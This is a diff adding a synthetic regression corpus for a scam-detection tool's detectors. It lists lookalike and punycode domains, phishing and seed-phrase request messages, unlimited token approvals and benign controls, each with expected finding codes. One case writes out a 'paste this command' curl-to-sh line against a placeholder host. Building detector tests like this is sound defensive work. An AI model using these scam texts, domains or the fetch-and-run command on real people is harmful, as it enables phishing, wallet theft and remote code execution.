@@ -1,0 +1,277 @@
+{
+  "dataset": "adversarial-corpus",
+  "dataset_version": "2026-07-24.1",
+  "description": "Versioned, local regression corpus for deterministic Scam Guard detectors. Cases are synthetic and contain no personal data. Malicious cases: expected_codes must all be emitted and, when present, min_severity is the minimum risk_level any single finding must reach (low < medium < high < critical). Benign cases must never raise a medium-or-above finding (RFC-002 unknown/low-only floor for controls).",
+  "cases": [
+    {
+      "id": "domain-lookalike",
+      "subject_kind": "domain",
+      "value": "metamask-login.help",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-004",
+        "SG-IMP-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-punycode",
+      "subject_kind": "domain",
+      "value": "xn--pple-43d.com",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-003"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-known-not-safe",
+      "subject_kind": "domain",
+      "value": "metamask.io",
+      "malicious": false,
+      "expected_codes": [
+        "SG-UNK-001"
+      ]
+    },
+    {
+      "id": "text-seed-ask",
+      "subject_kind": "message_text",
+      "value": "To unlock your wallet, enter your 12 word recovery phrase immediately.",
+      "malicious": true,
+      "expected_codes": [
+        "SG-ASK-001"
+      ],
+      "min_severity": "critical"
+    },
+    {
+      "id": "text-pipe-shell",
+      "subject_kind": "message_text",
+      "value": "Paste this command into Terminal: curl -sL https://example.invalid/i.sh | sh",
+      "malicious": true,
+      "expected_codes": [
+        "SG-INJ-001"
+      ],
+      "min_severity": "critical"
+    },
+    {
+      "id": "text-gift-card",
+      "subject_kind": "message_text",
+      "value": "Buy Apple gift cards and send the codes to release your payment.",
+      "malicious": true,
+      "expected_codes": [
+        "SG-ASK-003"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "text-benign",
+      "subject_kind": "message_text",
+      "value": "The interview is scheduled for Tuesday at 3pm and compensation is paid by bank transfer.",
+      "malicious": false,
+      "expected_codes": []
+    },
+    {
+      "id": "intent-unlimited-approval",
+      "subject_kind": "transaction_intent",
+      "value": "intent-corpus-unlimited",
+      "intent": {
+        "decoded_action": {
+          "kind": "erc20_approve",
+          "allowance": {
+            "kind": "unlimited"
+          }
+        }
+      },
+      "malicious": true,
+      "expected_codes": [
+        "SG-ALLOW-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "intent-blanket-approval",
+      "subject_kind": "transaction_intent",
+      "value": "intent-corpus-blanket",
+      "intent": {
+        "decoded_action": {
+          "kind": "set_approval_for_all",
+          "allowance": {
+            "kind": "unlimited"
+          }
+        }
+      },
+      "malicious": true,
+      "expected_codes": [
+        "SG-ALLOW-003",
+        "SG-ALLOW-001"
+      ],
+      "min_severity": "critical"
+    },
+    {
+      "id": "domain-homoglyph-cyrillic",
+      "subject_kind": "domain",
+      "value": "un\u0456swap.org",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-001",
+        "SG-IMP-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-punycode-brand-lookalike",
+      "subject_kind": "domain",
+      "value": "xn--bnance-pvf.com",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-003"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-subdomain-brand-squat",
+      "subject_kind": "url",
+      "value": "https://uniswap.org.wallet-verify.top/connect",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-004",
+        "SG-IMP-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-hyphenated-typosquat",
+      "subject_kind": "domain",
+      "value": "coin-base.com",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "domain-hyphenated-brand-in-host",
+      "subject_kind": "domain",
+      "value": "paypal-secure-verify.com",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-004",
+        "SG-IMP-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "text-seed-ask-indirect",
+      "subject_kind": "message_text",
+      "value": "Please connect your wallet and read out the backup words so we can restore your locked account.",
+      "malicious": true,
+      "expected_codes": [
+        "SG-ASK-001"
+      ],
+      "min_severity": "critical"
+    },
+    {
+      "id": "domain-benign-legit-subdomain-uniswap",
+      "subject_kind": "domain",
+      "value": "docs.uniswap.org",
+      "malicious": false,
+      "expected_codes": [
+        "SG-UNK-001"
+      ]
+    },
+    {
+      "id": "domain-benign-legit-subdomain-coinbase",
+      "subject_kind": "domain",
+      "value": "help.coinbase.com",
+      "malicious": false,
+      "expected_codes": [
+        "SG-UNK-001"
+      ]
+    },
+    {
+      "id": "domain-benign-legit-subdomain-paypal",
+      "subject_kind": "domain",
+      "value": "support.paypal.com",
+      "malicious": false,
+      "expected_codes": [
+        "SG-UNK-001"
+      ]
+    },
+    {
+      "id": "domain-benign-regional-cctld-amazon",
+      "subject_kind": "domain",
+      "value": "amazon.co.jp",
+      "malicious": false,
+      "expected_codes": []
+    },
+    {
+      "id": "domain-benign-regional-cctld-google",
+      "subject_kind": "domain",
+      "value": "google.co.uk",
+      "malicious": false,
+      "expected_codes": []
+    },
+    {
+      "id": "domain-tld-swap-unverified",
+      "subject_kind": "domain",
+      "value": "binance.xyz",
+      "malicious": true,
+      "expected_codes": [
+        "SG-DOM-001"
+      ],
+      "min_severity": "medium"
+    },
+    {
+      "id": "text-fake-celebrity-endorsement-presale",
+      "subject_kind": "message_text",
+      "value": "NEW ANNOUNCEMENT: the platform confirms the launch of its native asset. $ABC TOKEN EXCLUSIVE PRESALE — VERIFIED BY a well-known founder",
+      "malicious": true,
+      "expected_codes": [
+        "SG-IMP-002",
+        "SG-PROMO-001"
+      ],
+      "min_severity": "high"
+    },
+    {
+      "id": "text-airdrop-wallet-claim-funnel",
+      "subject_kind": "message_text",
+      "value": "You're eligible for our token airdrop. Connect your wallet to claim your reward before the round closes.",
+      "malicious": true,
+      "expected_codes": [
+        "SG-PROMO-001"
+      ],
+      "min_severity": "medium"
+    },
+    {
+      "id": "text-unsolicited-crypto-payout-job-dm",
+      "subject_kind": "message_text",
+      "value": "I'm looking for someone to moderate my server part-time. Payout is 0.8 Sol per day, plus a 40% staking option for team members.",
+      "malicious": true,
+      "expected_codes": [
+        "SG-PROMO-002"
+      ],
+      "min_severity": "medium"
+    },
+    {
+      "id": "text-benign-apple-airdrop-feature",
+      "subject_kind": "message_text",
+      "value": "I'll AirDrop you the photos from my phone in a sec, just make sure your laptop is discoverable.",
+      "malicious": false,
+      "expected_codes": []
+    },
+    {
+      "id": "text-benign-ordinary-endorsement",
+      "subject_kind": "message_text",
+      "value": "The audit report was independently verified by our legal team before it went out.",
+      "malicious": false,
+      "expected_codes": []
+    },
+    {
+      "id": "text-benign-ordinary-crypto-industry-job",
+      "subject_kind": "message_text",
+      "value": "The role pays a base salary plus quarterly bonus; benefits start after the standard 90-day period.",
+      "malicious": false,
+      "expected_codes": []
+    }
+  ]
+}
